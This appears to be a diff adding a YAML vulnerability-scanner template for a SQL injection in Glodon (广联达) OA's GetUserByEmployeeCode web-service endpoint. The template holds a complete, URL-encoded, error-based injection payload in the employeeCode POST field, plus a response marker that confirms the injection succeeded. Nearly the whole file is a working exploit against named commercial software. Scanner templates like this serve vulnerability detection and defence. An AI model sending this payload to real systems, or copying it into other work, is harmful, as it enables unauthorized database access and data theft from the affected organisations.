@@ -1,0 +1,14 @@
+name: 广联达OA-GetUserByEmployeeCode-sql
+description: >-
+  sql注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /Org/service/Service.asmx/GetUserByEmployeeCode
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >-
+      employeeCode=1%27+AND+9748+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%289748%3D9748%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29+AND+%27KENl%27%3D%27KENl&EncryptData=1
+    expression:
+      body_all: ["qbvjq1qxzzq"]
